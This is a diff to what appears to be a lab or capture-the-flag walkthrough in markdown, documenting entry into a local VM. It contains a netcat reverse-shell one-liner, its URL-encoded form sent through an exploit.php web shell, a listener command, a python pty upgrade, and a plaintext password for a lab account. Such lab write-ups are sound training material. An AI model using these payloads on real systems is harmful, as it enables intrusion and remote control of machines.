@@ -114,9 +114,9 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.56.1 9999 >/tmp/f
 
 URL encode: rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.56.1%209999%20%3E%2Ftmp%2Ff
 
-https://192.168.56.1:443/var/www/forum/templates_c/exploit.php?payload=
+https://192.168.56.101:443/forum/templates_c/exploit.php?payload=
 
-https://192.168.56.1:443/var/www/forum/templates_c/exploit.php?payload=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.56.1%209999%20%3E%2Ftmp%2Ff
+https://192.168.56.101:443/forum/templates_c/exploit.php?payload=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.56.1%209999%20%3E%2Ftmp%2Ff
 
 ```
 
@@ -125,3 +125,20 @@ Listen with nc:
 
 nc -lnvp 9999
 ```
+
+#### SHELL access !!!
+![screenshot](screen/SHELL.png)
+
+#### ls -lra /home
+![screenshot](screen/lsHOME.png)
+
+#### LOOKATME file --> get password for lmezard shell
+![screenshot](screen/LOOKATMEFILE.png)
+
+#### Get interactive shell with python
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+Login: lmezard
+Password: G!@M6f4Eatau{sF"
+```
+![screenshot](screen/TTYshell.png)
